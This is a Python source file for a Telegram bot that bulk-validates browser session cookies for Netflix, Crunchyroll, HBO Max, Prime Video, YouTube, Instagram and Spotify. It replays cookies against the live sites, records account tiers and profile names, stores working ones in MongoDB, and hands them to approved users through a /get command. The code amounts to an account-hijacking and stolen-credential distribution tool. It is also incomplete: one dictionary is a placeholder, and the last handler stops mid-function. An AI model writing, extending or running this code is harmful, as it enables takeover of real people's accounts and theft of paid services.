#!/usr/bin/env python3
"""
MULTI-PLATFORM COOKIE CHECKER BOT - TELEGRAM C2
Supports: Netflix, Crunchyroll, HBO Max, Prime Video, YouTube, Instagram, Spotify.
Accepts .zip files for bulk upload.
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import ssl
import uuid
import tempfile
import zipfile
import io
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import urlparse, quote, unquote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
DATABASE_NAME = os.getenv("DATABASE_NAME", "cookies_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

# API config
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "500"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "10"))
AUTO_DELETE_EXPIRED = os.getenv("AUTO_DELETE_EXPIRED", "True").lower() == "true"
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")

# Platforms
PLATFORMS = [
    "netflix", "crunchyroll", "hbomax", "primevideo", 
    "youtube", "instagram", "spotify"
]

# ----------------------------- LOGGING ---------------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("cookies_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("cookies_bot")

# ========================== PREMIUM EMOJI SUPPORT ============================
PREMIUM_EMOJIS = { ... }  # same as before (keep full dict)

def get_emoji(emo: str) -> str:
    emoji_id = PREMIUM_EMOJIS.get(emo)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emo}</tg-emoji>'
    return emo

# ========================== UTILITY FUNCTIONS =============================
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def random_string(length: int = 16) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def parse_netscape_cookie(cookie_text: str) -> Dict[str, str]:
    cookie_dict = {}
    lines = cookie_text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookie_dict[name] = value
    return cookie_dict

def validate_cookie_generic(cookie: str) -> bool:
    if not cookie:
        return False
    cookie = cookie.strip()
    # Netscape format: domain TRUE path secure expiry name value
    if 'TRUE' in cookie and ('com' in cookie or 'tv' in cookie or 'prime' in cookie):
        return True
    # Standard format with = and ; or spaces
    if '=' in cookie and ';' in cookie:
        return True
    # Base64 detection
    try:
        decoded = base64.b64decode(cookie, validate=True)
        if decoded:
            return True
    except:
        pass
    return False

def parse_cookie(cookie: str) -> Dict[str, str]:
    cookie = cookie.strip()
    cookie_dict = {}
    if 'TRUE' in cookie and '.' in cookie:
        try:
            cookie_dict = parse_netscape_cookie(cookie)
            if cookie_dict:
                return cookie_dict
        except:
            pass
    try:
        decoded = base64.b64decode(cookie, validate=True)
        try:
            cookie = decoded.decode('utf-8')
        except:
            pass
    except:
        pass
    if ';' in cookie:
        parts = cookie.split(';')
    else:
        parts = cookie.split()
    for part in parts:
        part = part.strip()
        if '=' in part:
            key, value = part.split('=', 1)
            cookie_dict[key.strip()] = value.strip()
    return cookie_dict

def normalize_cookie(cookie: str) -> str:
    cookie = cookie.replace('\r', '')
    cookie = cookie.replace('\n', '\\n')
    return cookie

def denormalize_cookie(cookie: str) -> str:
    return cookie.replace('\\n', '\n')

def extract_cookies_from_text(content: str) -> List[str]:
    cookies = []
    lines = content.splitlines()
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if validate_cookie_generic(line):
            cookies.append(line)
        else:
            logger.debug(f"Skipping invalid cookie line: {line[:50]}...")
    return cookies

# ========================== PLATFORM CHECKERS =============================
class PlatformChecker:
    @staticmethod
    async def check_netflix(cookie: str) -> Dict:
        # Existing Netflix checker logic (same as before, but we may reuse)
        result = {"valid": False, "account_tier": None, "profile_name": None, "profile_language": None, "maturity_level": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie_str,
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.netflix.com/in/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    final_lower = final_url.lower()
                    if "login" in final_lower or "signin" in final_lower:
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "sign out" in html_lower:
                        logged_in = True
                    else:
                        # look for profile JSON
                        profile_data = PlatformChecker._extract_profile_json(html, "netflix")
                        if profile_data:
                            logged_in = True
                            result["profile_name"] = profile_data.get("profileName", "Unknown")
                            result["account_tier"] = profile_data.get("tier", "Unknown")
                            result["profile_language"] = profile_data.get("language", "en-US")
                            result["maturity_level"] = profile_data.get("maturity", "Unknown")
                        else:
                            logged_in = any(x in final_lower for x in ["browse", "watch", "title"]) or ("profile" in html_lower and "avatar" in html_lower)
                    if not logged_in:
                        result["error"] = "Not logged in"
                        return result
                    result["valid"] = True
                    if not result["profile_name"]:
                        # fallback extract
                        result["profile_name"] = PlatformChecker._extract_field(html, "profileName")
                    if not result["account_tier"]:
                        result["account_tier"] = PlatformChecker._extract_field(html, "accountTier") or "Unknown"
                    if not result["profile_language"]:
                        result["profile_language"] = PlatformChecker._extract_field(html, "language") or "en-US"
                    if not result["maturity_level"]:
                        result["maturity_level"] = PlatformChecker._extract_field(html, "maturityLevel") or "Unknown"
                    # expiry
                    expire_match = re.search(r'"expires"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
                    if expire_match:
                        result["expires_at"] = expire_match.group(1)
                    else:
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    return result
        except asyncio.TimeoutError:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_crunchyroll(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.crunchyroll.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "signin" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "profile" in html_lower or "account" in html_lower:
                        result["valid"] = True
                        # extract username from page
                        name_match = re.search(r'"username":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        # extract subscription tier
                        tier_match = re.search(r'"subscription_type":"([^"]+)"', html)
                        if tier_match:
                            result["account_tier"] = tier_match.group(1).title()
                        else:
                            result["account_tier"] = "Unknown"
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_hbomax(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.max.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "signin" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "profile" in html_lower:
                        result["valid"] = True
                        # extract name
                        name_match = re.search(r'"givenName":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        result["account_tier"] = "Unknown"
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_primevideo(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.primevideo.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "signin" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "your account" in html_lower:
                        result["valid"] = True
                        # extract name from HTML
                        name_match = re.search(r'"name":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        result["account_tier"] = "Prime"  # default
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_youtube(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.youtube.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "signin" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "account" in html_lower:
                        result["valid"] = True
                        # extract channel name from JSON
                        name_match = re.search(r'"name":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        result["account_tier"] = "YouTube Premium" if "premium" in html_lower else "Free"
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_instagram(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.instagram.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "accounts/login" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "profile" in html_lower:
                        result["valid"] = True
                        # extract username from JSON
                        name_match = re.search(r'"username":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        result["account_tier"] = "Instagram"  # no tier
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    async def check_spotify(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None, "expires_at": None, "error": None}
        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": cookie_str,
        }
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                async with session.get("https://www.spotify.com/", headers=headers, timeout=timeout, ssl=None, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    html_lower = html.lower()
                    if "login" in final_url.lower() or "signin" in final_url.lower():
                        result["error"] = "Redirected to login"
                        return result
                    if "logout" in html_lower or "profile" in html_lower:
                        result["valid"] = True
                        name_match = re.search(r'"displayName":"([^"]+)"', html)
                        if name_match:
                            result["profile_name"] = name_match.group(1)
                        else:
                            result["profile_name"] = "Unknown"
                        # check premium
                        if "premium" in html_lower:
                            result["account_tier"] = "Premium"
                        else:
                            result["account_tier"] = "Free"
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    else:
                        result["error"] = "Not logged in"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    def _extract_profile_json(html: str, platform: str) -> Optional[Dict]:
        # generic extraction for Netflix
        if platform == "netflix":
            # look for profileName etc.
            profile = {}
            match = re.search(r'"profileName"\s*:\s*"([^"]+)"', html)
            if match:
                profile["profileName"] = match.group(1)
                tier_match = re.search(r'"accountTier"\s*:\s*"([^"]+)"', html)
                profile["tier"] = tier_match.group(1) if tier_match else "Unknown"
                lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html)
                profile["language"] = lang_match.group(1) if lang_match else "en-US"
                maturity_match = re.search(r'"maturityLevel"\s*:\s*"([^"]+)"', html)
                profile["maturity"] = maturity_match.group(1) if maturity_match else "Unknown"
                return profile
        return None

    @staticmethod
    def _extract_field(html: str, field: str) -> Optional[str]:
        pattern = rf'"{field}"\s*:\s*"([^"]+)"'
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1)
        return None

# ========================== DATABASE =====================================
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        self._init_indexes()
        self._init_defaults()
    
    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("platform", ASCENDING), ("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("platform", ASCENDING), ("status", ASCENDING)])
            self.cookies.create_index([("platform", ASCENDING), ("account_tier", ASCENDING)])
            self.cookies.create_index([("platform", ASCENDING), ("expires_at", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
            self.checks.create_index([("user_id", ASCENDING)])
            logger.info("Database indexes initialized")
        except Exception as e:
            logger.error(f"Index initialization error: {e}")
    
    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {
                    "username": "admin",
                    "approved": True,
                    "is_admin": True,
                    "created_at": get_current_time()
                }},
                upsert=True
            )
        self.settings.update_one(
            {"_id": "global"},
            {"$setOnInsert": {
                "auto_delete_expired": AUTO_DELETE_EXPIRED,
                "max_bulk_check": MAX_BULK_CHECK,
                "concurrent_checks": CONCURRENT_CHECKS,
                "updated_at": get_current_time()
            }},
            upsert=True
        )
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "is_admin": user_id in ADMIN_IDS,
            "approved_at": None,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": get_current_time(),
            "last_active": get_current_time()
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time()}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None}}
        )
        return result.modified_count > 0
    
    def is_user_approved(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        return user.get("approved", False)
    
    def update_user_activity(self, user_id: int):
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"last_active": get_current_time()}}
        )
    
    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        self.users.update_one(
            {"user_id": user_id},
            {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}}
        )
    
    def add_cookie(self, cookie: str, platform: str, user_id: int = None) -> str:
        cookie = normalize_cookie(cookie.strip())
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"platform": platform, "cookie_hash": cookie_hash})
        if existing:
            return existing.get("_id")
        cookie_id = str(uuid.uuid4())
        cookie_data = {
            "_id": cookie_id,
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "platform": platform,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": get_current_time(),
            "views": 0
        }
        try:
            self.cookies.insert_one(cookie_data)
            logger.info(f"Added cookie for {platform}: {cookie_id[:8]}")
            return cookie_id
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"platform": platform, "cookie_hash": cookie_hash})["_id"]
    
    def add_cookies_bulk(self, cookies: List[str], platform: str, user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and validate_cookie_generic(cookie):
                try:
                    cookie_id = self.add_cookie(cookie, platform, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "invalid_format"})
        return results
    
    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        return self.cookies.find_one({"_id": cookie_id})
    
    def find_cookie_by_prefix(self, prefix: str, platform: str = None) -> Optional[Dict]:
        query = {"_id": {"$regex": f"^{prefix}"}}
        if platform:
            query["platform"] = platform
        docs = list(self.cookies.find(query).limit(2))
        if len(docs) == 1:
            return docs[0]
        elif len(docs) > 1:
            return None
        return None
    
    def get_cookie_by_hash(self, cookie_hash: str, platform: str) -> Optional[Dict]:
        return self.cookies.find_one({"platform": platform, "cookie_hash": cookie_hash})
    
    def get_valid_cookie_by_hash(self, cookie_hash: str, platform: str) -> Optional[Dict]:
        doc = self.cookies.find_one({"platform": platform, "cookie_hash": cookie_hash, "status": "valid"})
        if doc:
            expires = doc.get("expires_at")
            if expires:
                try:
                    exp_date = datetime.strptime(expires, "%Y-%m-%d").replace(tzinfo=timezone.utc)
                    if exp_date < get_current_time():
                        return None
                except:
                    pass
        return doc
    
    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        updates = {
            "status": status,
            "checked_at": get_current_time()
        }
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})
    
    def get_pending_cookies(self, platform: str = None, limit: int = 100) -> List[Dict]:
        query = {"status": "pending"}
        if platform:
            query["platform"] = platform
        return list(self.cookies.find(query).limit(limit))
    
    def get_valid_cookies(self, platform: str = None, limit: int = 100) -> List[Dict]:
        query = {"status": "valid"}
        if platform:
            query["platform"] = platform
        return list(self.cookies.find(query).sort("checked_at", -1).limit(limit))
    
    def get_cookie_stats(self, platform: str = None) -> Dict:
        query = {}
        if platform:
            query["platform"] = platform
        total = self.cookies.count_documents(query)
        valid = self.cookies.count_documents({**query, "status": "valid"})
        invalid = self.cookies.count_documents({**query, "status": "invalid"})
        expired = self.cookies.count_documents({**query, "status": "expired"})
        pending = self.cookies.count_documents({**query, "status": "pending"})
        tier_stats = {}
        if platform:
            for tier in ["Basic", "Standard", "Premium", "Free", "Prime"]:
                tier_stats[tier] = self.cookies.count_documents({
                    **query,
                    "status": "valid",
                    "account_tier": tier
                })
        return {
            "total": total,
            "valid": valid,
            "invalid": invalid,
            "expired": expired,
            "pending": pending,
            "tiers": tier_stats
        }
    
    def delete_cookie(self, cookie_id: str) -> bool:
        result = self.cookies.delete_one({"_id": cookie_id})
        return result.deleted_count > 0
    
    def delete_invalid_cookies(self, platform: str = None) -> int:
        query = {"status": {"$in": ["invalid", "expired"]}}
        if platform:
            query["platform"] = platform
        result = self.cookies.delete_many(query)
        return result.deleted_count
    
    def cleanup_expired(self, platform: str = None) -> int:
        query = {"status": "expired"}
        if platform:
            query["platform"] = platform
        result = self.cookies.delete_many(query)
        return result.deleted_count
    
    def log_check(self, user_id: int, cookie_id: str, platform: str, status: str, details: Dict = None):
        check_data = {
            "user_id": user_id,
            "cookie_id": cookie_id,
            "platform": platform,
            "status": status,
            "details": details,
            "timestamp": get_current_time()
        }
        self.checks.insert_one(check_data)
    
    def get_user_checks(self, user_id: int, limit: int = 20) -> List[Dict]:
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ========================== PLATFORM CHECKER DISPATCH =========================
PLATFORM_CHECKERS = {
    "netflix": PlatformChecker.check_netflix,
    "crunchyroll": PlatformChecker.check_crunchyroll,
    "hbomax": PlatformChecker.check_hbomax,
    "primevideo": PlatformChecker.check_primevideo,
    "youtube": PlatformChecker.check_youtube,
    "instagram": PlatformChecker.check_instagram,
    "spotify": PlatformChecker.check_spotify,
}

async def check_single_cookie_platform(cookie: str, platform: str) -> Dict:
    checker = PLATFORM_CHECKERS.get(platform)
    if not checker:
        return {"valid": False, "error": f"Unsupported platform: {platform}"}
    return await checker(cookie)

async def check_bulk_cookies_platform(cookies: List[str], platform: str, progress_callback=None) -> List[Dict]:
    checker = PLATFORM_CHECKERS.get(platform)
    if not checker:
        return [{"cookie": c, "valid": False, "error": "Unsupported platform"} for c in cookies]
    semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
    results = []
    async def check_one(cookie: str, index: int):
        async with semaphore:
            result = await checker(cookie)
            result["cookie"] = cookie
            result["index"] = index + 1
            if progress_callback:
                await progress_callback(index + 1, len(cookies))
            return result
    tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
    res = await asyncio.gather(*tasks, return_exceptions=True)
    for r in res:
        if isinstance(r, Exception):
            results.append({"cookie": "", "valid": False, "error": str(r)})
        else:
            results.append(r)
    return results

# ========================== INLINE KEYBOARD BUILDERS =====================
def build_login_keyboard(cookie_id: str, platform: str, nftoken: str = None) -> InlineKeyboardMarkup:
    # For platforms other than Netflix, we might not have nftoken; provide generic login link
    if platform == "netflix" and nftoken:
        url = f"https://www.netflix.com/login?nftoken={nftoken}"
    else:
        base_urls = {
            "netflix": "https://www.netflix.com/login",
            "crunchyroll": "https://www.crunchyroll.com/login",
            "hbomax": "https://www.max.com/login",
            "primevideo": "https://www.primevideo.com/login",
            "youtube": "https://accounts.google.com/ServiceLogin",
            "instagram": "https://www.instagram.com/accounts/login/",
            "spotify": "https://www.spotify.com/login/"
        }
        url = base_urls.get(platform, "https://www.google.com")
    keyboard = [
        [InlineKeyboardButton("🔑 Login", url=url)],
        [InlineKeyboardButton("📤 Upload File", callback_data=f"upload_{cookie_id}"),
         InlineKeyboardButton("🔄 Restart", callback_data="restart")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========================== STYLISH HELPERS ==============================
SEP = "━━━━━━━━━━━━━━━━━━━━"

def format_header(title: str, emoji: str = "🎬") -> str:
    return f"{get_emoji(emoji)} <b>{title}</b> {get_emoji('🌟')}"

# ========================== TELEGRAM HANDLERS ============================
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text(
                f"{get_emoji('⛔️')} <b>Unauthorized</b>\nYou are not allowed to use this command.",
                parse_mode="HTML"
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>\n\n"
            f"Your account is not approved.\nContact admin.",
            parse_mode="HTML"
        )
        return

    text = (
        f"{format_header('Multi‑Platform Cookie Checker', '🎬')}\n"
        f"{SEP}\n"
        f"{get_emoji('⚡')} <b>Supported platforms:</b> {', '.join(PLATFORMS)}\n\n"
        f"{get_emoji('📌')} <b>Commands</b>\n"
        f"  /check <code>&lt;platform&gt; &lt;cookie&gt;</code> – Single check\n"
        f"  /upload <code>&lt;platform&gt;</code> – Upload .zip file\n"
        f"  /valid <code>&lt;platform&gt;</code> – List valid cookies\n"
        f"  /get <code>&lt;platform&gt;</code> – Get one valid cookie\n"
        f"  /stats – Show counts per platform\n"
        f"  /help – This message\n\n"
        f"{get_emoji('👑')} <b>Admin Commands</b>\n"
        f"  /approve, /disapprove, /users, /export, /cleanup, /clear\n\n"
        f"{get_emoji('🦇')} <b>Developer:</b> @Xalonexdev03"
    )
    await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Usage:</b> <code>/check &lt;platform&gt; &lt;cookie&gt;</code>\n"
            f"Platforms: {', '.join(PLATFORMS)}",
            parse_mode="HTML"
        )
